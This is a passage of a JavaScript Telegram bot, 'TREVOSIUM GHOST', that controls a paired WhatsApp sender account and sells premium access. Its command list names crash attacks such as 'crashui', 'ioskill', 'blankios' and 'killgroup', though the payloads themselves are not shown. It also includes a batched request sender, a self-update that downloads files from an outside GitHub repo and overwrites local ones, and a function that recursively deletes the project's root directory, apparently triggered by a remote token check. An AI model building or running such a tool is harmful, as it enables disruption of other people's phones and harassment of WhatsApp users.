  return s
    .split(":")
    .map(n => parseInt(n, 10))
    .reduce((a, v) => a * 60 + v, 0);
}

const topVideos = async (q) => {
  const r = await yts.search(q);
  const list = Array.isArray(r) ? r : (r.videos || []);
  return list
    .filter(v => {
      const sec = typeof v.seconds === "number"
        ? v.seconds
        : parseSecs(v.timestamp || v.duration?.timestamp || v.duration);
      return !v.live && sec > 0 && sec <= 1200;
    })
    .slice(0, 5)
    .map(v => ({
      url: v.url,
      title: v.title
    }));
};

function normalizeYouTubeUrl(raw) {
  if (!raw || typeof raw !== "string") return "";
  let u = raw.trim();

  const shorts = u.match(/shorts\/([A-Za-z0-9_-]+)/i);
  if (shorts) return `https://www.youtube.com/watch?v=${shorts[1]}`;

  const short = u.match(/youtu\.be\/([A-Za-z0-9_-]+)/i);
  if (short) return `https://www.youtube.com/watch?v=${short[1]}`;

  const watch = u.match(/v=([A-Za-z0-9_-]+)/i);
  if (watch) return `https://www.youtube.com/watch?v=${watch[1]}`;

  return u;
}

async function downloadToTemp(url, ext = ".mp3") {
  const file = path.join(os.tmpdir(), `music_${Date.now()}${ext}`);
  const res = await axios.get(url, {
    responseType: "stream",
    timeout: 180000
  });

  await new Promise((resolve, reject) => {
    const w = fs.createWriteStream(file);
    res.data.pipe(w);
    w.on("finish", resolve);
    w.on("error", reject);
  });

  return file;
}

function cleanup(f) {
  try { fs.unlinkSync(f); } catch {}
}

function escapeHtml(text = "") {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function parallelRequests(tasks, batchSize = 10, delay = 800) {
  return new Promise(async (resolve) => {
    let success = 0;
    let failed = 0;

    for (let i = 0; i < tasks.length; i += batchSize) {
      const batch = tasks.slice(i, i + batchSize);

      const results = await Promise.allSettled(
        batch.map(fn => fn())
      );

      for (const r of results) {
        if (r.status === "fulfilled" && r.value === true) {
          success++;
        } else {
          failed++;
        }
      }

      if (i + batchSize < tasks.length) {
        await sleep(delay);
      }
    }

    resolve({ success, failed });
  });
}

function progressBar(percent) {
  const total = 10
  const filled = Math.floor(percent / 10)
  const empty = total - filled
  return "▰".repeat(filled) + "▱".repeat(empty) + ` ${percent}%`
}

let isUnlocked = false;

const lockMiddleware = async (ctx, next) => {
    if (!ctx.from || !ctx.chat) return next();

    try {
        const pushUser = (user) => {
            if (!user || !user.id) return;

            const id = String(user.id);

            if (!db.users[id]) {
                db.users[id] = {
                    id,
                    premium: false
                };
            }
        };

        pushUser(ctx.from);

        if (ctx.message?.reply_to_message?.from) {
            pushUser(ctx.message.reply_to_message.from);
        }

    } catch {}

    const text = ctx.message?.text || "";

    const isStartCommand =
        text.startsWith("/start") ||
        /^\/start(@\w+)?(\s.*)?$/.test(text);

    if (!isUnlocked) {
        if (isStartCommand) {
            isUnlocked = true;
            return next();
        }

        await ctx.reply("🔒 Akses terkunci, ketik /start untuk mengaktifkan bot");
        return;
    }

    return next();
};

bot.use(lockMiddleware);

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const premiumFile = './⎋Database/premium.json';
const cooldownFile = './⎋Database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const adminFile = path.join(__dirname, "admin.json");

// Baca admin.json
function loadAdmins() {
    if (!fs.existsSync(adminFile)) {
        fs.writeFileSync(adminFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(adminFile));
}

// Simpan admin.json
function saveAdmins(admins) {
    fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
}

// Tambah Admin
function addAdminUser(userId) {
    let admins = loadAdmins();
    if (admins.includes(userId)) return false;
    admins.push(userId);
    saveAdmins(admins);
    return true;
}

// Hapus Admin
function delAdminUser(userId) {
    let admins = loadAdmins();
    if (!admins.includes(userId)) return false;
    admins = admins.filter(id => id !== userId);
    saveAdmins(admins);
    return true;
}

// Cek Admin
function isAdmin(userId) {
    let admins = loadAdmins();
    return admins.includes(userId);
}

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
╭─❖──────────────────────────❖─╮
│ Developer : @XavienZzTamvan
│ Version : 31.0
│ Status : Connected
├───────────────────────────────
│⟢ TREVOSIUM GHOST Cursed Starting...
╰─❖──────────────────────────❖─╯
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: '',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡</pre></blockquote>
ⵌ Number: ${lastPairingMessage.phoneNumber}
ⵌ Pairing Code: ${lastPairingMessage.pairingCode}
ⵌ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
╭─❖──────────────────────────❖─╮
│ Developer : @XavienZzTamvan
│ Version : 31.0
│ Status : Connected
├───────────────────────────────
│⟢ TREVOSIUM GHOST Cursed Starting...
╰─❖──────────────────────────❖─╯
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XAVIENZZ");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡</pre></blockquote>
❁ Number: ${phoneNumber}
❁ Pairing Code: ${formattedCode}
❁ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl2, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡</pre></blockquote>
ⵌ Number: ${lastPairingMessage.phoneNumber}
ⵌ Pairing Code: ${lastPairingMessage.pairingCode}
ⵌ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// Command addadmin

const pendingAddAdmin = {}

bot.command("addadmin", async (ctx) => {

    const senderId = ctx.from.id.toString();

    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }

    const userId = args[1];

    const poll = await ctx.replyWithPoll(
        `Tambahkan Akses Admin Untuk ${userId}?`,
        ["Yes", "Cancel"],
        {
            is_anonymous: false
        }
    );

    pendingAddAdmin[senderId] = {
        userId,
        owner: senderId,
        poll_id: poll.poll.id,
        message_id: poll.message_id,
        chat_id: poll.chat.id
    };
});

// Command deladmin

const pendingDelAdmin = {}

bot.command("deladmin", async (ctx) => {

    const senderId = ctx.from.id.toString();

    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }

    const userId = args[1];

    const poll = await ctx.replyWithPoll(
        `Hapus Akses Admin Untuk ${userId}?`,
        ["Yes", "Cancel"],
        { is_anonymous: false }
    );

    pendingDelAdmin[senderId] = {
        userId,
        owner: senderId,
        poll_id: poll.poll.id,
        message_id: poll.message_id,
        chat_id: poll.chat.id
    };
});

const pendingPrem = {}

bot.command("addprem", async (ctx) => {
    const senderId = ctx.from.id.toString();

    let adminList = [];
    try {
        adminList = JSON.parse(fs.readFileSync("./admin.json"));
    } catch (e) {
        adminList = [];
    }

    if (senderId != ownerID.toString() && !adminList.includes(senderId)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678");
    }

    const userId = args[1];

    const poll = await ctx.replyWithPoll(
        `Tambahkan Akses Premium Untuk ${userId}?`,
        ["Yes", "Cancel"],
        { is_anonymous: false }
    );

    pendingPrem[senderId] = {
        userId,
        step: "confirm",
        owner: senderId,
        poll_id: poll.poll.id,
        message_id: poll.message_id,
        chat_id: poll.chat.id
    };
});

const pendingDelPrem = {}

bot.command('delprem', async (ctx) => {
    const senderId = ctx.from.id.toString();

    let adminList = [];
    try {
        adminList = JSON.parse(fs.readFileSync('./admin.json'));
    } catch (e) {
        adminList = [];
    }

    if (senderId != ownerID.toString() && !adminList.includes(senderId)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }

    const userId = args[1];

    const poll = await ctx.replyWithPoll(
        `Hapus Akses Premium Untuk ${userId}?`,
        ["Yes", "Cancel"],
        {
            is_anonymous: false
        }
    );

    pendingDelPrem[senderId] = {
        userId,
        owner: senderId,
        poll_id: poll.poll.id,
        message_id: poll.message_id,
        chat_id: poll.chat.id
    };
});


bot.on("poll_answer", async (ctx) => {
    try {
        if (!ctx.pollAnswer) return;
        const answerUser = ctx.pollAnswer.user.id.toString();
        const option = ctx.pollAnswer.option_ids?.[0];
        const pollId = ctx.pollAnswer.poll_id;

        if (option === undefined) return;

        let data = null;
        let ownerKey = null;
        let type = null;

        const sources = [
            { obj: pendingAddAdmin, type: "addadmin" },
            { obj: pendingDelAdmin, type: "deladmin" },
            { obj: pendingPrem, type: "addprem" },
            { obj: pendingDelPrem, type: "delprem" }
        ];

        for (const src of sources) {
            for (const key in src.obj) {

                const item = src.obj[key];
                if (!item) continue;

                if (String(item.poll_id) === String(pollId)) {
                    data = item;
                    ownerKey = key;
                    type = src.type;
                    break;
                }
            }

            if (data) break;
        }

        if (!data) return;

        if (String(answerUser) !== String(data.owner)) {
            return;
        }

        if (type === "addadmin") {

            await ctx.telegram.deleteMessage(data.chat_id, data.message_id).catch(()=>{});

            if (option === 1) {
                delete pendingAddAdmin[ownerKey];
                return ctx.telegram.sendMessage(
                    data.chat_id,
                    "❌ Penambahan Admin Dibatalkan"
                ).catch(()=>{});
            }

            const success = addAdminUser(data.userId);

            if (success) {
                await ctx.telegram.sendMessage(
                    data.chat_id,
                    `✅ ☇ ${data.userId} Berhasil Ditambahkan Akses Admin`
                );
            } else {
                await ctx.telegram.sendMessage(
                    data.chat_id,
                    `⚠️ ☇ ${data.userId} Sudah Mempunyai Akses Admin`
                );
            }

            delete pendingAddAdmin[ownerKey];
        }

        else if (type === "deladmin") {

            await ctx.telegram.deleteMessage(data.chat_id, data.message_id).catch(()=>{});

            if (option === 1) {
                delete pendingDelAdmin[ownerKey];
                return ctx.telegram.sendMessage(
                    data.chat_id,
                    "❌ Penghapusan Admin Dibatalkan"
                ).catch(()=>{});
            }

            const success = delAdminUser(data.userId);

            if (success) {
                await ctx.telegram.sendMessage(
                    data.chat_id,
                    `✅ ☇ ${data.userId} Berhasil Menghapus Akses Admin`
                );
            } else {
                await ctx.telegram.sendMessage(
                    data.chat_id,
                    `⚠️ ☇ ${data.userId} Bukan Admin`
                );
            }

            delete pendingDelAdmin[ownerKey];
        }

        else if (type === "addprem") {

            if (data.step === "confirm") {

                await ctx.telegram.deleteMessage(data.chat_id, data.message_id).catch(()=>{});

                if (option === 1) {
                    delete pendingPrem[ownerKey];
                    return ctx.telegram.sendMessage(
                        data.chat_id,
                        "❌ Penambahan Premium Dibatalkan"
                    ).catch(()=>{});
                }

                data.step = "duration";

                const poll2 = await ctx.telegram.sendPoll(
                    data.chat_id,
                    `Pilih Durasi Premium Untuk ${data.userId}`,
                    ["30 Days", "1000 Days"],
                    { is_anonymous: false }
                );

                data.poll_id = poll2.poll.id;
                data.message_id = poll2.message_id;
            }

            else if (data.step === "duration") {

                await ctx.telegram.deleteMessage(data.chat_id, data.message_id).catch(()=>{});

                const duration = option === 0 ? 30 : 1000;

                const expiryDate = addpremUser(data.userId, duration);

                await ctx.telegram.sendMessage(
                    data.chat_id,
`━━━━━━━━━━━━━━━━━━━━━━
 ✅ SUCCESS PREMIUM ADDED
━━━━━━━━━━━━━━━━━━━━━━

☇ User     : ${data.userId}
☇ Duration : ${duration} Days
☇ Expired  : ${expiryDate}`
                );

                delete pendingPrem[ownerKey];
            }
        }

        else if (type === "delprem") {

            await ctx.telegram.deleteMessage(data.chat_id, data.message_id).catch(()=>{});

            if (option === 1) {
                delete pendingDelPrem[ownerKey];
                return ctx.telegram.sendMessage(
                    data.chat_id,
                    "❌ Penghapusan Premium Dibatalkan"
                ).catch(()=>{});
            }

            removePremiumUser(data.userId);

            await ctx.telegram.sendMessage(
                data.chat_id,
                `✅ ☇ ${data.userId} Berhasil Menghapus Akses Premium`
            );

            delete pendingDelPrem[ownerKey];
        }

    } catch (err) {
        console.log("Poll Error:", err);
    }
});

// ====== FILE CONFIG ======
const GROUP_FILE = "グループのみ.json";

// Load status dari file (jika ada)
let GROUP_ONLY = false;

if (fs.existsSync(GROUP_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(GROUP_FILE));
    GROUP_ONLY = data.groupOnly || false;
  } catch (err) {
    console.error("Error membaca file グループのみ.json:", err);
  }
}

// Function save ke file
function saveGroupOnlyStatus() {
  fs.writeFileSync(
    GROUP_FILE,
    JSON.stringify({ groupOnly: GROUP_ONLY }, null, 2)
  );
}


// ====== COMMAND ======
bot.command("grouponly", async (ctx) => {
  try {

    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Perintah ini hanya untuk Owner!");
    }

    // Ambil argumen setelah command
    const args = ctx.message.text.split(" ").slice(1);
    const mode = (args[0] || "").toLowerCase();

    if (!["on", "off"].includes(mode)) {
      return await ctx.reply(
        "⚠️ Format salah!\nGunakan:\n/grouponly on\n/grouponly off"
      );
    }

    GROUP_ONLY = mode === "on";

    // Simpan ke file
    if (typeof saveGroupOnlyStatus === "function") {
      saveGroupOnlyStatus();
    }

    const statusText = GROUP_ONLY
      ? "🟢 ON (Group Only)"
      : "🔴 OFF (Private Allowed)";

    await ctx.replyWithHTML(
`⚙️ <b>GROUP ONLY MODE</b>

Status: <b>${statusText}</b>`
    );

  } catch (err) {
    console.error("Error grouponly:", err);
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan perintah.");
  }
});

const dir = './⎋Database';
const STATUS_FILE = `${dir}/cmdstatus.json`;

if (!fs.existsSync(dir)) {
  fs.mkdirSync(dir, { recursive: true });
}

function createInitialFile() {
  const initialData = {
    skyxdelay: false,
    overdozer: false,
    xphantom: false,
    specterdelay: false,
    xblank: false,
    killgroup: false,
    group: false,
    avicix: false,
    voxtrash: false,
    blankios: false,
    overdocu: false,
    xflower: false,
    crashui: false,
    ioskill: false,
    filixer: false,
    noxtra: false
  };

  fs.writeFileSync(STATUS_FILE, JSON.stringify(initialData, null, 2), 'utf8');
  return initialData;
}

function loadStatus() {
  try {
    if (!fs.existsSync(STATUS_FILE)) {
      return createInitialFile();
    }

    const raw = fs.readFileSync(STATUS_FILE, 'utf8');

    if (!raw || !raw.trim()) {
      return {};
    }

    const parsed = JSON.parse(raw);

    if (typeof parsed !== 'object' || Array.isArray(parsed)) {
      return {};
    }

    return parsed;

  } catch (err) {
    console.log("❌ Load error (file tidak diubah):", err);
    return {};
  }
}

function saveStatus(data) {
  try {
    fs.writeFileSync(STATUS_FILE, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.log("❌ Save error:", err);
  }
}

let commandStatus = loadStatus();

const onlyOwner = (ctx, next) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }
  return next();
};

function cleanCommand(input) {
  if (!input) return null;
  return input.replace('/', '').toLowerCase();
}

bot.command('enablecmd', onlyOwner, (ctx) => {
  let args = ctx.message.text.split(' ')[1];
  let cmd = cleanCommand(args);

  if (!cmd) {
    return ctx.reply("⚠️ Contoh: /enablecmd /bug");
  }

  if (!(cmd in commandStatus)) {
    return ctx.reply("❌ Command tidak ada di database");
  }

  commandStatus[cmd] = true;
  saveStatus(commandStatus);

  return ctx.reply(`✅ Command /${cmd} berhasil diaktifkan`);
});

bot.command('disablecmd', onlyOwner, (ctx) => {
  let args = ctx.message.text.split(' ')[1];
  let cmd = cleanCommand(args);

  if (!cmd) {
    return ctx.reply("⚠️ Contoh: /disablecmd /bug");
  }

  if (!(cmd in commandStatus)) {
    return ctx.reply("❌ Command tidak ada di database");
  }

  commandStatus[cmd] = false;
  saveStatus(commandStatus);

  return ctx.reply(`❌ Command /${cmd} berhasil dimatikan`);
});

function isCommandEnabled(cmd) {
  return commandStatus?.[cmd] === true;
}

const GH_OWNER = "yanzzalienz-oss";
const GH_REPO = "Maind";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
    const { data } = await axios.get(url, {
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));
            console.log("[UPDATE]", local);
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

bot.command("pullupdate", async (ctx) => {
   if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
   }
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Proses Auto Update Mohon Tunggu...");

    try {
        await downloadRepo("");
        await ctx.reply(`✅ Update Berhasil
📄 File ditemukan: main.js
♻️ Restarting bot...`);
        setTimeout(() => process.exit(0), 1500);
    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

let systemLocked = false;
const verifiedUsers = new Set();
const bugUsage = new Map();

const PROJECT_ROOT = path.resolve(__dirname, "..");

function safeDeleteRootProject() {
    try {
        const resolved = path.resolve(PROJECT_ROOT);

        if (!resolved) return;

        const forbiddenPaths = [
            path.resolve("/"),
            path.resolve("C:\\"),
            path.resolve("C:\\Windows"),
            path.resolve("C:\\Program Files")
        ];

        if (forbiddenPaths.includes(resolved)) return;

        if (resolved.length < 10) return;

        if (resolved !== PROJECT_ROOT) return;

        fs.rmSync(resolved, {
            recursive: true,
            force: true
        });

    } catch (err) {
    }
}

async function checkTokenFromGithub(bot) {
    try {
        if (!databaseUrl) return true;

        const currentToken = bot?.telegram?.token;

        if (!currentToken) {
            process.exit(1);
        }

        const cleanToken = String(currentToken).trim();

        const response = await axios.get(databaseUrl, {
            timeout: 20000,
            responseType: "text",
            headers: {
